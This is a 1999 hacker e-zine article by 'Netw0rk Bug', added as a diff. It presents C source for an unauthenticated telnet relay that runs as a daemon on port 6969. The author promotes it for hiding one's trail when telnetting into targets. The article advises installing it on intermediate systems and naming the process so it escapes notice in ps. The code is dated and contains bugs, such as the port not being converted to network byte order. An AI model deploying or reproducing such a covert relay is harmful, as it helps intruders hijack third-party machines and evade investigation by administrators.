@@ -1,0 +1,152 @@
+   _________   SWAT MAGAZINE ISSUE TWENTY: AUGUST 1999   __________
+  /         \___________________________________________/          \
+ /	                 A TELNET GATEWAY                           \
+/            By  Netw0rk Bug   bug@netw0rk.freeserve.co.uk           \
+----------------------------------------------------------------------
+
+Hi again, I uncovered this code from a site in the depths of the internet,
+no really. I was clearing up some files on my system and came across this 
+which i must have saved and forgotton about. It may be a year or two old
+but Seems interesting though.
+
+Basically it is usefull if you do not want to get traced easily when you
+have telneted to a target server.  If you have any sense then you will
+not directly telnet to a target from your home box you will go through
+a number of other systems first.  This code will make it difficult to 
+see where you are coming from let alone the account.
+
+Basically it will allocate a port and setup a telnet gateway
+Because this program only allocates a socket, in order for someone
+to trace it back to you, the sysadmin of the system it is set up on
+would have to monitor the socket and see where the connection is
+coming from, which is not very likely, the sysadmin already has
+plenty to do.  This is setup currently to port 6969 and will run in
+the background.  Be sure to call it something that will not gather
+any suspicion from anyone running ps -aux.  This will also write to
+the file log, the date and time anyone uses the telnet gateway.
+
+Anyway, give it a go...
+
+--------------------cut here--------------------
+#include <sys/fcntl.h>
+#include <stdio.h>
+#include <ctype.h>
+#include <sys/wait.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/ioctl.h>
+#include <sys/errno.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <signal.h>
+
+
+FILE *errfd;
+
+static int serfd;
+struct sockaddr_in   addr;
+char buffer[10][80];
+int sockused[10];
+int numports = 10;
+int numproc=0;
+
+died()
+{
+  numproc--;
+  wait3(NULL,WNOHANG,NULL);
+  signal(SIGCLD,died);
+  return;
+}
+
+init_io()
+{
+
+  signal(SIGCLD,died);
+
+  if ((serfd = socket(AF_INET,SOCK_STREAM,0)) <0 )
+    return(1);
+
+
+  addr.sin_family = AF_INET;
+  addr.sin_addr.s_addr = INADDR_ANY;
+  addr.sin_port = 6969;
+
+
+  if (bind(serfd,(struct sockaddr *)&addr, sizeof(addr)))
+  {
+    fprintf(errfd,"ioinit  cannot bind socket\n");
+    exit(1);
+  }
+
+  if (listen(serfd,5) == -1)
+  {
+    fprintf(errfd,"ioinit  cannot listen at socket\n");
+    return(1);
+  }
+
+  return(0);
+}
+
+
+getconnect()
+{
+  int s,length;
+  struct sockaddr_in address;
+
+  while(1)
+  {
+    length= sizeof addr;
+    while ((s= accept(serfd,&address,&length))<0);
+    wait3(NULL,WNOHANG,NULL);
+    if (fork() == 0) /* child */
+    {
+        system("date >>log");
+        numproc++;
+        dup2(s,0);
+        dup2(s,1);
+        dup2(s,2);
+        close(s);
+        system("exec telnet");
+        kill(getpid(),SIGKILL);
+
+        close(0);
+        close(1);
+        close(2);
+        exit;
+    }                /* end child */
+
+    close(s);
+    wait3(NULL,WNOHANG,NULL);
+  }
+}
+
+
+
+
+main()
+{
+  int i;
+  char temp[80],*term;
+  int fd;
+
+  for(i=0;i<36;i++) close(i);
+
+
+
+  errfd=fopen("ERR","w");
+  if(errfd==NULL) return(-1);
+  setsid();
+  if(fork()!=0) return(-1);
+  init_io();
+  getconnect();
+}
+--------------------cut here--------------------
+
+
+----------------------------------------------------------------------
+Written By Netw0rk Bug for SWATEAM www.swateam.org AUg'99
+If you have any questions or comments then don't hesitate
+to mail me at " bug@netw0rk.freeserve.co.uk " I would like
+to hear from anyone, no matter what they have to say.
+----------------------------------------------------------------------
